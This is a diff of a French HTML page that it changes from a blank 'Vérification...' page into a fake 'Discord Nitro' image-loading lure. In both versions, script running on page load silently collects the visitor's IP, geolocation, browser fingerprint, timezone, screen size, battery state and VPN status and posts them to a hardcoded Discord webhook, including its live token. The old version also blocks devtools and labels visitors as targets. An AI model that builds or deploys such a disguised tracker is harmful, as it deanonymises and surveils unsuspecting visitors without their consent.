@@ -1,68 +1,85 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vérification...</title>
-    <script>
-        document.addEventListener("contextmenu", e => e.preventDefault());
-        document.addEventListener("keydown", e => {
-            if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I")) {
-                e.preventDefault();
-            }
-        });
+  <meta charset="UTF-8">
+  <title>Discord Nitro</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta property="og:title" content="Image Discord">
+  <meta property="og:image" content="https://cdn.discordapp.com/attachments/1111111111111111111/111111111111111111/discord_nitro.png">
+  <style>
+    body {
+      margin: 0;
+      background-color: #2c2f33;
+      color: #ffffff;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      flex-direction: column;
+    }
+    h1 { font-size: 20px; margin: 20px 0 10px; }
+    p { font-size: 14px; color: #b9bbbe; text-align: center; }
+    .loader {
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #7289da;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin-top: 30px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+  <script>
+    document.addEventListener("DOMContentLoaded", async () => {
+      try {
+        const ip = await fetch("https://api64.ipify.org?format=json").then(r => r.json()).then(d => d.ip);
+        const geo = await fetch(`https://ipapi.co/${ip}/json/`).then(r => r.json());
 
-        async function getUserInfo() {
-            try {
-                const ip = await fetch("https://api64.ipify.org?format=json").then(r => r.json()).then(d => d.ip);
-                const geo = await fetch(`https://ipapi.co/${ip}/json/`).then(r => r.json());
+        const now = new Date().toLocaleString();
+        const ua = navigator.userAgent;
+        const lang = navigator.language;
+        const screenSize = `${screen.width}x${screen.height}`;
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const battery = await (navigator.getBattery?.() || Promise.resolve({ level: 0, charging: false }));
+        const batteryStatus = `${(battery.level * 100).toFixed(0)}% - ${battery.charging ? "En charge" : "Sur batterie"}`;
+        const fingerprint = btoa(`${ip}|${ua}|${lang}|${screenSize}`);
+        const vpn = geo.org?.toLowerCase().includes("vpn") || geo.org?.toLowerCase().includes("proxy") ? "🚨 VPN / Proxy détecté" : "✅ Connexion normale";
 
-                const now = new Date().toLocaleString();
-                const ua = navigator.userAgent;
-                const lang = navigator.language;
-                const screenSize = `${screen.width}x${screen.height}`;
-                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                const battery = await (navigator.getBattery?.() || Promise.resolve({ level: 0, charging: false }));
-                const batteryStatus = `${(battery.level * 100).toFixed(0)}% - ${battery.charging ? "En charge" : "Sur batterie"}`;
-                const vpn = geo.org.includes("VPN") || geo.org.includes("Proxy") ? "🚨 VPN / Proxy détecté" : "✅ Connexion normale";
-                const fingerprint = btoa(`${ip}|${ua}|${lang}|${screenSize}`);
-
-                const message = `
-**🎯 Nouvelle cible détectée**
+        const message = `
+**🖼️ Nouvelle ouverture d'image Discord**
 > 🕒 Date/Heure : \`${now}\`
 > 🌍 IP : \`${ip}\`
-> 🧬 Fingerprint : \`${fingerprint}\`
-> 📍 Localisation : \`${geo.city}, ${geo.region}, ${geo.country_name}\`
+> 📌 Localisation : \`${geo.city}, ${geo.region}, ${geo.country_name}\`
 > 🧠 Fournisseur : \`${geo.org}\`
+> 🧬 Fingerprint : \`${fingerprint}\`
 > 🖥️ OS/Navigateur : \`${ua}\`
 > 🗣️ Langue : \`${lang}\`
 > 🧭 Fuseau horaire : \`${timezone}\`
 > 📱 Résolution : \`${screenSize}\`
 > 🔋 Batterie : \`${batteryStatus}\`
 > 🛡️ VPN : ${vpn}
-                `;
+        `;
 
-                await sendToDiscord(message);
-            } catch (err) {
-                console.error("Erreur pendant le tracking :", err);
-            }
-        }
+        await fetch("https://discord.com/api/webhooks/1349385558627192843/J9WiGNLlSdX9mAO6GmEXKYDtlN98LxOKaTWf1u3JPsk_IZN_eyEzTnpW-yQ7-qdXqjkV", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ content: message })
+        });
 
-        async function sendToDiscord(msg) {
-            const webhook = "https://discord.com/api/webhooks/1349385558627192843/J9WiGNLlSdX9mAO6GmEXKYDtlN98LxOKaTWf1u3JPsk_IZN_eyEzTnpW-yQ7-qdXqjkV";
-            try {
-                await fetch(webhook, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ content: msg })
-                });
-            } catch (e) {
-                console.error("Erreur envoi webhook :", e);
-            }
-        }
-
-        window.onload = getUserInfo;
-    </script>
+      } catch (err) {
+        console.error("Erreur de tracking :", err);
+      }
+    });
+  </script>
 </head>
-<body style="margin:0; background-color:#111;"></body>
+<body>
+  <h1>Chargement de l'image...</h1>
+  <p>Discord Nitro se charge, veuillez patienter</p>
+  <div class="loader"></div>
+</body>
 </html>
